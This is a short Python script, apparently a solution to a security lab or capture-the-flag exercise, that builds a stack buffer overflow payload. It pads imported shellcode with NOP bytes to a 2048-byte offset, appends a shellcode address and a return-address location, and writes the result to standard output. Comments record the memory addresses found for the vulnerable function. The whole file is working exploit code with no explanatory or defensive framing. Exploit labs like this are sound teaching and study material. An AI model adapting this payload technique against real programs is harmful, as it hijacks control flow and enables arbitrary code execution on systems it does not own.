#!/usr/bin/env python3

import sys

from shellcode import shellcode

#place where shellcode runs: 0x7ffffff69960

#place where call to vulnerable is 0x0000000000401e82

#place in vulnerable where return address is: 0x7ffffff6a178

offset_to_return = 2048
addressA = 0x7ffffff69960
addressP = 0x7ffffff6a178

payload = shellcode + b'\x90' * (offset_to_return - len(shellcode)) + addressA.to_bytes(8, 'little') + addressP.to_bytes(8, 'little')

sys.stdout.buffer.write(payload)

#sys.stdout.buffer.write(shellcode)
